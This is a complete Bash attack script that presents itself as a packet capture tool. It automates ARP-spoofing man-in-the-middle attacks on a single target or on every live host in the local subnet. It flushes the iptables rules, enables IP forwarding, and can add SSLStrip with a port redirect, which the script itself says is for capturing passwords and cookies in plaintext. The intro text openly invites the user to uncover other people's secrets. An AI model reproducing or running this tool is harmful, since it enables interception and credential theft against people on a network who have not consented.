#!/bin/bash

# Colors for formatting
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No color

# Thrilling introduction message
echo -e "${MAGENTA}========================================${NC}"
echo -e "${CYAN}Welcome to the Packet Capture Script!${NC}"
echo -e "${MAGENTA}========================================${NC}"
echo -e "${CYAN}Ready to discover what's going on around you?${NC}"
echo -e "${CYAN}Are you ready to see what you cannot see?${NC}"
echo -e "${CYAN}You will have the ability to see what you cannot see.${NC}"
echo -e "${CYAN}But remember, everything they're hiding is more than just data, it's their secrets.${NC}"
echo -e "${CYAN}Don't hesitate, this is your chance to live an unforgettable adventure... but be careful!${NC}"
echo -e "${MAGENTA}========================================${NC}"

# Ensure the script is run as root
if [[ $EUID -ne 0 ]]; then
    echo -e "${RED}You need ROOT privileges to execute this script.${NC}"
    exit 1
fi

# Flush old iptables rules before starting
echo -e "${YELLOW}Flushing old iptables rules...${NC}"
iptables -t nat -F
iptables -F
iptables -X

# Enable IP forwarding
echo -e "${YELLOW}Enabling IP forwarding...${NC}"
sysctl -w net.ipv4.ip_forward=1 &>/dev/null

# Cleanup function to restore system state on exit
function cleanup() {
    echo -e "${RED}\nRestoring system configuration...${NC}"
    sysctl -w net.ipv4.ip_forward=0 &>/dev/null
    
    echo -e "${YELLOW}Flushing iptables rules...${NC}"
    iptables -t nat -F
    iptables -F
    iptables -X

    if [[ -n "$sslstrip_pid" ]]; then
        kill $sslstrip_pid 2>/dev/null
        wait $sslstrip_pid 2>/dev/null
    fi
    if [[ -n "$arpspoof_pids" ]]; then
        kill $arpspoof_pids 2>/dev/null
    fi

    echo -e "${GREEN}Cleanup complete.${NC}"
    exit 0
}

# Trap CTRL+C to trigger cleanup
trap cleanup SIGINT

# Automatically detect the router IP
router=$(ip route | grep default | awk '{print $3}')
if [[ -z "$router" ]]; then
    echo -e "${RED}Unable to detect router. Please check your network connection.${NC}"
    exit 1
fi

# Function to select a network interface
function select_interface() {
    while true; do
        echo -e "\n${MAGENTA}========================================${NC}"
        echo -e "${CYAN}Available network interfaces:${NC}"
        interfaces=$(ifconfig -a | grep -oP '^\w+')
        i=1
        declare -gA iface_map
        while IFS= read -r line; do
            echo -e "${GREEN}[$i] $line${NC}"
            iface_map["$i"]="$line"
            i=$((i + 1))
        done <<< "$interfaces"

        echo -e "\n${YELLOW}Enter the number of the network interface you want to use: ${NC}"
        read -p "$(echo -e "${YELLOW}Your choice: ${NC}")" iface_number

        if [[ -n "${iface_map["$iface_number"]}" ]]; then
            selected_iface="${iface_map["$iface_number"]}"
            echo -e "${GREEN}Selected interface: $selected_iface${NC}"
            return
        else
            echo -e "${RED}Invalid selection. Please try again.${NC}"
        fi
    done
}

select_interface

# Display router information
echo -e "${GREEN}Router IP: $router${NC}"

# Enable SSLStrip (optional)
function enable_sslstrip() {
    while true; do
        echo -e "\n${CYAN}SSLStrip can strip HTTPS encryption, enabling you to capture sensitive data like passwords and cookies in plaintext.${NC}"
        echo -e "${YELLOW}This can be useful in man-in-the-middle attacks, but it may not work on modern HTTPS configurations.${NC}"
        read -p "$(echo -e "${YELLOW}Enable SSLStrip? (yes/y or no/n): ${NC}")" sslstrip_choice
        case $sslstrip_choice in
            yes|y)
                echo -e "${YELLOW}Starting SSLStrip...${NC}"
                sslstrip -l 8080 & sslstrip_pid=$!
                iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
                echo -e "${GREEN}SSLStrip enabled.${NC}"
                break
                ;;
            no|n)
                echo -e "${GREEN}Skipping SSLStrip.${NC}"
                break
                ;;
            *)
                echo -e "${RED}Invalid input. Please answer 'yes/y' or 'no/n'.${NC}"
                ;;
        esac
    done
}

# Attack a single device continuously
function attack_single_continuous() {
    while true; do
        read -p "Enter target IP: " target_ip
        if [[ -z "$target_ip" ]]; then
            echo -e "${RED}Invalid IP address. Please try again.${NC}"
            continue
        fi
        enable_sslstrip
        echo -e "${GREEN}Starting ARP spoofing on $target_ip...${NC}"
        
        # Attack the device continuously
        echo -e "${GREEN}Attacking now... $target_ip Press CTRL+C to stop.${NC}"
        while true; do
        arpspoof -i $selected_iface -t $target_ip $router &> /dev/null & arpspoof_pids+=" $!"
        arpspoof -i $selected_iface -t $router $target_ip &> /dev/null & arpspoof_pids+=" $!"
        sleep 3  # Shorter sleep to maintain constant pressure on the target
        done
    done
}

# Attack the entire network continuously
function attack_all_continuous() {
    network=$(ip -o -f inet addr show $selected_iface | awk '/scope global/ {print $4}')
    IFS=. read -r i1 i2 i3 i4 <<< $(echo $network | cut -d'/' -f1)
    enable_sslstrip
    declare -A attacked_devices

    echo -e "${YELLOW}Scanning network and launching continuous ARP spoofing...${NC}"
    while true; do
        for ip in $(seq 1 254); do
            target_ip="${i1}.${i2}.${i3}.${ip}"
            if ping -c 1 -W 1 $target_ip &>/dev/null && [[ -z "${attacked_devices[$target_ip]}" ]]; then
                attacked_devices[$target_ip]=1
                echo -e "${GREEN}New device found: $target_ip Attacking now... Press CTRL+C to stop.${NC}"
                arpspoof -i $selected_iface -t $target_ip $router &> /dev/null & arpspoof_pids+=" $!"
                arpspoof -i $selected_iface -t $router $target_ip &> /dev/null & arpspoof_pids+=" $!"
            fi
        done
        sleep 15
    done
}

# Prompt user to choose attack type
function select_attack_type() {
    while true; do
        echo -e "${YELLOW}Select attack type:${NC}"
        echo "[1] Single Device (Continuous)"
        echo "[2] Entire Network (Continuous)"
        read -p "Your choice: " attack_choice
        case $attack_choice in
            1) attack_single_continuous; break ;;
            2) attack_all_continuous; break ;;
            *)
                echo -e "${RED}Invalid choice. Please choose 1 or 2.${NC}"
                ;;
        esac
    done
}

select_attack_type
